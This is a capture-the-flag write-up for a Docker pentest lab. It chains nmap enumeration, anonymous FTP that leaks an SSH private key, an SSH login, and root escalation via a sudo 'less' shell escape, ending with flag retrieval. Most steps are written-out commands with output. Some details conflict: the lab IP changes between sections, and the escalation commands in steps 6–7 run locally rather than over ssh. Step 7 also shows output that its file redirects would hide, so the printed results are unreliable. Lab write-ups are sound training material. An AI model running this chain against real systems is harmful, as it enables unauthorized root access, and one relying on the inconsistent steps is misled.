# North Yard Node

> LATAM Energy Grid left the North Yard node in recovery mode. Download the lab zip (Google Drive) and run it on Kali/Linux with Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-pt01.tar`
>
> The script displays the lab IP (172.18.0.2). Enumerate with nmap. Do not expose the container to the internet.
>
> **Tip:** start with a full nmap scan of the lab IP. Do not assume a single port.

**Flag:** `WHOAMI{ftp_p4t10_n0rt3}`

---

## Walkthrough

This is a pentesting challenge: the tip ("do not assume a single port") indicates that the web service is not the only one, and the attack chain is FTP → SSH key → user → root escalation.

### 1. Start the lab

```bash
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-pt01
172.17.0.2
```

### 2. Enumerate all ports with nmap

**Tool:** `nmap`. **Why:** a full port scan reveals the complete attack surface; the tip warns there is more than one service.

**Parameters:** `-sV` (service version) and `-p-` (all 65535 ports, not just the common ones).

```bash
$ nmap -sV -p- 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

**What I saw:** three services — FTP, SSH, and HTTP. Since this is pentesting, the chain likely involves several.

### 3. Anonymous FTP

**Tool:** `curl` with user `anonymous`. **Why:** vsftpd often allows anonymous access; exploring is free.

```bash
$ curl -s "ftp://172.17.0.2/" --user "anonymous:"
drwxr-xr-x  avisos
drwxr-xr-x  respaldo
```

**What I saw:** there is a `respaldo/norte` folder containing an **OpenSSH private key** (`llave_patio`) and a `turno_asignado.txt` file that says "Titular: operador.norte". Decision: that key must be used to access via SSH.

```bash
$ file llave_patio
OpenSSH private key
```

### 4. Access via SSH with the key

**Tool:** `ssh`. **Why:** the FTP key points to user `operador.norte` on port 22.

**Parameters:** `-i llave_patio` (identity key), `-o StrictHostKeyChecking=no` (do not validate host key in the lab).

```bash
$ chmod 600 llave_patio
$ ssh -i llave_patio operador.norte@172.17.0.2 "id"
uid=1000(operador.norte) gid=1000(operador.norte)
```

### 5. Enumerate the system and find the escalation

**Tool:** `find` + `sudo -l`. **Why:** look for where the flag is and what can be run with elevated privileges.

```bash
$ ssh -i llave_patio operador.norte@172.17.0.2 "sudo -l"
User operador.norte may run the following commands:
    (root) NOPASSWD: /usr/bin/less
```

**What I saw:** I can run **`/usr/bin/less` as root without a password**. `less` allows launching commands from its prompt with `!` (GTFOBins): this gives a root shell.

### 6. Escalate to root with `sudo less`

**Tool:** `script -qc` + `sudo less`. **Why:** `less` needs a TTY to process the `!` command; `script -qc` creates a pseudo-TTY and we pass the sequence via stdin.

```bash
$ printf '!/bin/sh -c "id > /tmp/pwned"\nq\n' | script -qc "sudo less /etc/shadow" /dev/null
$ cat /tmp/pwned
uid=0(root) gid=0(root)
```

**Root achieved!** (`uid=0`). The `!` inside `less` executes a shell as root.

### 7. Locate the flag

With root, search for the flag files:

```bash
$ printf '!/bin/sh -c "ls -la /root; find / -iname *.dat 2>/dev/null | grep -v proc"\nq\n' | script -qc "sudo less /etc/shadow" /dev/null
/root/flag.txt
/var/lib/latam/patio.dat
```

Two candidates. Read them separately:

```bash
$ printf '!/bin/sh -c "cat /root/flag.txt > /tmp/a; cat /var/lib/latam/patio.dat > /tmp/b"\nq\n' | script -qc "sudo less /etc/shadow" /dev/null
=== root/flag.txt ===
WHOAMI{docker_exec_detected_n1ce_try}
=== /var/lib/latam/patio.dat ===
WHOAMI{ftp_p4t10_n0rt3}
```

**The real flag is `/var/lib/latam/patio.dat`**: `WHOAMI{ftp_p4t10_n0rt3}`. The one in `/root/flag.txt` is a **honeypot** — a trap for anyone who tries `docker exec cat /root/flag.txt` instead of solving the challenge's attack chain (the same decoy appears in the Gateway SCADA challenge). The flag reference is precisely the intended access path: FTP + north yard.

## Lesson

In pentesting, do not assume a single service: the full nmap scan (`-p-`) uncovers the complete chain. Here anonymous FTP leaked an SSH key, and passwordless sudo on `less` (GTFOBins) gave root via `!`. Watch out for honeypots: a flag in `/root/flag.txt` accessible via `docker exec` can be a decoy — the real one is on the intended attack path for the challenge.
